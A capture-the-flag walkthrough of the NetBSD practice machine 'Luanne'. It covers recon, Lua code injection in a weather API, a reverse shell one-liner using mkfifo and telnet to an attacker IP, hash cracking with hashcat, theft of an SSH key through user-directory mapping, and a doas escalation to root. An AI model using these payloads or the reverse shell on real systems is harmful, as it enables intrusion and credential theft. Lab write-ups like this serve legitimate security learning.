title: Luanne - Walkthrough
---

Luanne was definitly a different flavor. I had to dig deeper into NetBSD and discover new commands. The foothold requires to make a lot of test and the privilege escaltion needs a good enumeration of the box. Overall, a very nice box !

## Recon
I start with a quick Nmap followed by a full scan with the default script (-C) and the -V tag to get more info about the services.

{% highlight sh %}
sudo nmap luanne && sudo nmap -sCV -p- luanne -oN nmap
{% endhighlight %}

We have SSH and 2 web servers on port 80 and 9001. I'm gonna grab a few informations here and then visit these servers : 

- Port 80: Nginx 1.19
- 1 entry in `robots.txt` => `/weather`
- Port 9001: Medusa httpd 1.12 (Supervisor Process Manager)
- Service info: <strong>NetBSD</strong>


Now let's have a look at the web site on port 80 `http://luanne`.
The server requests credentials to connect so, I've tried to visit the port 9001 and we have the same thing. 

It seems like we have to make a bit of research on these services, but before starting googling everything, I like to have some enumeration script in the background so, I'm gonna run `gobuster` and `nikto` on port 80. Remember that we had an entry (/weather) in `robots.txt`, moreover, if I try to browse to the `http://luanne/weather` directory, I got a <cite><strong>404 - Not Found</strong></cite>, but the good news is that the server is not asking for credentials anymore. Hence, I'm gonna try to enumerate that folder. 

{% highlight sh %}
gobuster dir -u http://luanne/weather -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 50
{% endhighlight %}
{% highlight sh %}
nikto -h http://luanne
{% endhighlight %}

While this is running, I'm gonna look for that service on port 9001. 

I've quickly found the [documentation](https://readthedocs.org/projects/supervisor/downloads/pdf/latest/) of the <strong>Supervisor Process Manager</strong>. 

> Supervisor is a client/server system that allows its users to monitor and control a number of processes on UNIX-like
operating systems.
It shares some of the same goals of programs like launchd, daemontools, and runit. Unlike some of these programs,
it is not meant to be run as a substitute for init as “process id 1”. Instead it is meant to be used to control processes
related to a project or a customer, and is meant to start like any other program at boot time.


Basically, it's a monitoring system. More interestingly, in the documentation I can see that they use the same credentials multiple times as an example, so, let's try to connect with the user user and the password 123. It worked!
As mentioned, it's a monitoring tool so we have access to a panel where we can do a few operations like, Start/Stop a service or check the logs etc...

From the three processes that we have access to, one allow me to have a sneak peak at the box.

Here I've taken a bit of time to make researches on that command. Apparently, <strong>NetBSD</strong> uses `bozohttpd` to run a web server. Here is the [doc](http://www.eterna.com.au/bozohttpd/bozohttpd.8.html) if you want to have a look at it.


| Argument | Description 	|
| -----: 	| ----- 		|
| -u | Enables the transformation of Uniform Resource Locators of the form /~user/ into the directory ~user/public_html (but see the -p option above). |
| -X | Enables directory indexing. A directory index will be generated only when the default file (i.e. index.html normally) is not present. |
| -s | Forces logging to be set to stderr always. |
| -i | Causes address to be used as the address to bind daemon mode. If otherwise unspecified, the address used to bind is derived from the myname, which defaults to the name returned by gethostname(3). Only the last -i option is used. This option is only valid with the -b option. |
| -I | Causes bozohttpd to use port instead of the default http port. When used with the -b option, it changes the bound port. Otherwise it forces redirections to use this port instead of the value obtained via getsockname(2). |
| -L | Adds a new Lua script for a particular prefix. The prefix should be an arbitrary text, and the script should be a full path to a Lua script. Multiple -L options may be passed. A separate Lua state is created for each prefix. The Lua script can register callbacks using the httpd.register_handler(\'\<name\>\', function) Lua function, which will trigger the execution of the Lua function function when a URL in the form http://\<hostname\>// is being accessed. The function is passed three tables as arguments, the server environment, the request headers, and the decoded query string plus any data that was sent as application/x-www-form-urlencoded. |
| -U | Causes bozohttpd to switch to the user and the groups of username after initialization. This option, like -t above, causes bozohttpd to clear the environment unless the -e option is given. |
| -b | Enables daemon mode, where bozohttpd detaches from the current terminal, running in the background and servicing HTTP requests. |

There is local web server running on port 3000. Interestingly enough, a Lua script is linked to the weather prefix, which reminds me about that weather directory on port 80. Could it be the same directory share by 2 different servers, Nginx and bozohttpd?
GoBuster reported only one entry /forecast for the weather folder.

Let's have a look at `http://luanne/weather/forecast`.

It's a `JSON` document saying that we need to use a parameter named `city` to get more data. 
By doing, `city=list`, I get all the cities available and then I can have the forecast for a specific city by doing `city=London` for example.

I know from the port 9001 that a `lua` script is behind, so my guess is that we might try to play with that `city` parameter and see if this is vulnerable or not. 

To do that, I like to use ZAP Proxy. My goal here is to force an error message from the website.
One of the first test I like to do is check if the input properly sanitize by the script. Hence, I put an ' at the of the name of the city. Like this:

>GET http://luanne/weather/forecast?city=London' HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 0
Host: luanne


And we got an error !

>HTTP/1.1 500 Error
Server: nginx/1.19.0
Date: Mon, 07 Dec 2020 10:50:14 GMT
Content-Type: application/json
Connection: keep-alive

><br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value

I guess the script concatenate the value that we put in the parameter and by putting a ', we just break the concatenation. I'm not very familiar with Lua, but the concatenation syntax is not very complicated. Just be sure of it, let's try concatenates a value inside the parameter.

> GET http://luanne/weather/forecast?city=Lon'%20..%20'don HTTP/1.1

We still have an error but the concatenation is successful ! 


>HTTP/1.1 500 Error
Server: nginx/1.19.0
Date: Mon, 07 Dec 2020 10:59:01 GMT
Content-Type: application/json
Connection: keep-alive

>{"code": 500,"error": "unknown city: London"}

Now we know that we can break outside the concatenation system and maybe execute commands on the system. The function that we want to use in Lua script is os.execute(). So, if I send this:

> GET http://luanne/weather/forecast?city=Lon'%20..%20os.execute(%22whoami%22)' HTTP/1.1

I get that response from the server:

> HTTP/1.1 500 Error
Server: nginx/1.19.0
Date: Mon, 07 Dec 2020 11:17:43 GMT
Content-Type: application/json
Connection: keep-alive

>{"code": 500,_httpd
\<br\>Lua error: [string "                httpd.write('{"code": 500,')..."]:2: attempt to call a boolean value

Which means that we have code execution. Great!
All we need to do now is to find a way to get a shell from that `RCE`.

## Foothold
First, I set up a listener on my machine.

{% highlight sh %}
nc -lvnp 2222
{% endhighlight %}

Then I've tried to invoke `netcat` and other tools on the box, but it seems like <strong>NetBSD</strong> doesn't like it. I found that interesting [blog](https://sentrywhale.covm/documentation/reverse-shell) where it gives a few commands to try on 
<strong>NetBSD</strong>.

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 172.18.0.2 8080 > /tmp/f

Let's try to send that to the remote server with `curl`. 


> curl "http://luanne/weather/forecast?city=Lond%27%20..%20os.execute(%22rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Ctelnet%2010.10.14.11%202222%20%3E%20/tmp/f%22)%20..%20%27on"


After a few seconds, I got connection on the box !

{% highlight text %}
uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
{% endhighlight %}

## User

In the `/var/www/` directory, there is a file named `.htpasswd`. Inside of it, I've found a crypted password for the `webapi_user`.

> webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0

I'm gonna use `hashcat` to crack it. 

First I look for the algorithm used to crypt the password and then I crack it with hashcat. 

{% highlight sh %}
echo -n "\$1\$vVoNCsOl\$lMtBS6GL2upDbR4Owhzyc0" > hash && wc -c hash
34 hash
{% endhighlight %}

{% highlight sh %}
hashcat --example-hashes | grep -E '^HASH:\s.{34}$' -B 3
{% endhighlight %}

{% highlight text %}
MODE: 400
TYPE: phpass
HASH: $P$946647711V1klyitUYhtB8Yw5DMA/w.
\--

MODE: 500
TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
HASH: $1$38652870$DUjsu4TTlTsOe/xxZ05uf/
\--

MODE: 3800
TYPE: md5($salt.$pass.$salt)
HASH: 78274b1105fb8a7c415b43ffe35ec4a9:6
{% endhighlight %}

We have a perfect match with the mode <strong>500</strong>.

{% highlight sh %}
hashcat -m 500 hash /usr/share/wordlists/rockyou.txt
{% endhighlight %}

After a few minutes, hashcat output the clear password `iamthebest`.

The username is `webapi_user` so let's try it the web server on port 80. Again, it works but nothing really interesting here. 

In the `/home` directory, we have only one folder for the user `r.michaels` so I'm gonna focus on that user and see what I can find. 

What I like to do is using `grep` to catch some valuable information in log files. Hence, I made a quick recursive search in the log `/var/log` folder.

{% highlight sh %}
grep -Ri "r.michaels" . 2>/dev/null
{% endhighlight %}

Inside the `./supervisord/log/processes_stdout.log`, we have the same record over and over... 

> /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www

It seems like the user `r.michaels` started a web server too by using almost the same command as the command that we got from the <strong>supervisor</strong>. Instead of listening on port `3000`, it uses the port `3001`. Also it stores the `PID` inside of a file called `/var/run/httpd_devel.pid`. 

{% highlight sh %}
cat /var/run/httpd_devel.pid
{% endhighlight %}
{% highlight sh %}
262
{% endhighlight %}

We can confirm that the process is running by typing these commands:

{% highlight sh %}
ps ax -U r.michaels
{% endhighlight %}

My first thought is to exploit the server as we exploited the first one. The <strong>Lua</strong> script is exactly the same, so, it should be possible to exploit it again. We have `curl` installed on the box, so, let's try it:

{% highlight sh %}
curl "http://127.0.0.1:3001/weather/forecast"
{% endhighlight %}
{% highlight text %}
{"code": 500, "error": "No city specified. Use 'city=list' to list available cities."}
{% endhighlight %}

Great, we have access to the server. Now I'm gonna try the same command as early:

{% highlight sh %}
curl "http://127.0.0.1:3001/weather/forecast?city=Lon'%20..%20'don"
{% endhighlight %}

I was waiting for the same error message that we got with first instance but here it's different. 
Just to be sure, I tried the same command on the port `3000` and the concatenation worked out !

{% highlight sh %}
curl "http://127.0.0.1:3000/weather/forecast?city=Lon'%20..%20'don"
{% endhighlight %}
{% highlight sh %}
{"code": 500,"error": "unknown city: London"}
{% endhighlight %}

I wasted a lot of time spinning my wheel by trying to get it works but for some reasons, it doesn't seem to work with that instance of the server. 

Finaly, I had to take a step back and analyze that command line again. 

> /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www

Recall from the first section, the parameter `-u` enables the transformation of a URL into a local directory. 
That means that we might be able to browse inside the local folders via the url. 

Here is nice [article](https://httpd.apache.org/docs/2.4/urlmapping.html) about it. 

> Traditionally on Unix systems, the home directory of a particular user can be referred to as ~user/. The module mod_userdir extends this idea to the web by allowing files under each user's home directory to be accessed using URLs such as the following.
>http://www.example.com/~user/file.html
For security reasons, it is inappropriate to give direct access to a user's home directory from the web. Therefore, the UserDir directive specifies a directory underneath the user's home directory where web files are located. Using the default setting of Userdir public_html, the above URL maps to a file at a directory like /home/user/public_html/file.html where /home/user/ is the user's home directory as specified in /etc/passwd.

Basicaly, if I access the server and then add `~r.michaels` to the url, I might be able to access the `public_html` folder inside `r.michaels` home directory. 

The first problem is that, if I try to access `http://127.0.0.1:3001`, I get an unauthorized error message. So we need to authorize ourself to connect to the home page. If you remember, we did that on the first instance using these creds:

-user: webapi_user
-pw: iamthebest

If we are lucky, the creds are the same on that instance. By analyzing the request that we made when we connected on the first instance, I can see that the authorization is made by sending an additional header value (Authorization):

>GET http://luanne/ HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Authorization: Basic d2ViYXBpX3VzZXI6aWFtdGhlYmVzdA==
Host: luanne

We can verify it by inverting the `base64` value to a text. 

{% highlight sh %}
echo -n "d2ViYXBpX3VzZXI6aWFtdGhlYmVzdA==" | base64 -d
{% endhighlight %}

{% highlight sh %}
webapi_user:iamthebest
{% endhighlight %}

So, we just need to add that value to our "curl" header.

{% highlight sh %}
curl "http://127.0.0.1:3001/" -H "Authorization: Basic d2ViYXBpX3VzZXI6aWFtdGhlYmVzdA=="
{% endhighlight %}

Now we can access the home page of the second instance on port `3001`.

All we need to do is adding `~r.michaels` to the url.

{% highlight sh %}
curl "http://127.0.0.1:3001/~r.michaels/" -H "Authorization: Basic d2ViYXBpX3VzZXI6aWFtdGhlYmVzdA=="
{% endhighlight %}

{% highlight text %}

{% endhighlight %}

Remember that the server has been started with the `-X` argument, which means that we have `directory indexing` enabled. This is why we have that response from the server. Be carreful to not forget the trailing `/` in the url. Otherwise, it won't work !

Great, we have access to the local `public_html` folder of `r.michaels`. 
There is a private key inside, let's grab it and connect via `ssh`.

{% highlight sh %}
curl "http://127.0.0.1:3001/~r.michaels/id_rsa" -H "Authorization: Basic d2ViYXBpX3VzZXI6aWFtdGhlYmVzdA=="
{% endhighlight %}

{% highlight sh %}
ssh -i key r.michaels@luanne
{% endhighlight %}

And we have access to the box as `r.michaels` now !
The user flag is inside the `/home/r.michaels` folder.

## Root

There is another folder that caught my eyes here `/home/r.michaels/backups`. 
Inside of it, there is a `.enc` file.

I tried different tools like `openssl` or `gpg` to decrypted it but wasn't able to decrypt that file. Remember that we are inside of a `NetBSD` system so, we should use the specific tools from <strong>NetBSD</strong>. After a quick search on Google, I've found a tool called `netpgp`.

Let's try it:

{% highlight sh %}
netpgp --decrypt --output=/var/mail/backup.tar.gz ./backups/devel_backup-2020-09-16.tar.gz.enc
{% endhighlight %}

Then decompress the archive:

{% highlight sh %}
cd /var/mail/ && tar -xvf backup.tar.gz
{% endhighlight %}

Inside of the extracted folders, I have a few files and another password inside the `devel-2020-09-16/www/.htpasswd` file:

> webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.

Let's use `hashcat` again and crack it !

{% highlight sh %}
echo -n "\$1\$6xc7I/LW\$WuSQCS6n3yXsjPMSmwHDu." > hash-root && hashcat -m 500 hash-root /usr/share/wordlists/rockyou.txt
{% endhighlight %}

By using `doas` and the new password, I now have root access on the box !

{% highlight sh %}
doas id
uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
{% endhighlight %}

<strong>Rooted;)</strong>
